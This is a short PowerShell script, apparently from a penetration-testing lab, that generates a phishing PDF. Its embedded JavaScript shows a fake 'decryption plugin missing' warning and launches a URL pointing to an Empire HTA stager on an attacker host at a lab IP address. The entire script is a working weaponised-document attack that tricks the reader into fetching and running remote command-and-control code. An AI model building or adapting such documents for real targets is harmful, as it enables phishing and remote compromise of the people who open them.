function New-PDFPhish {

# Set the launchURL address below to match your empire HTA stager from Kali 
$LaunchURL = 'http://10.10.75.X:3000/empire.hta'
$filename = 'C:\scripts\pdf\660-phish.pdf'
$message = 'Update Required! Close Acrobat Reader and try again.'

$payload = @"
 app.alert('Required Decryption Plugin Missing: MALICIOUS Update Required');
 app.launchURL('$LaunchURL');
"@

New-PDFJS -js $payload -msg $message -filename $filename
}

Add-Type -Path c:\scripts\pdf\PdfSharp-WPF.dll
. C:\scripts\pdf\New-PDFJS.ps1

New-PDFPhish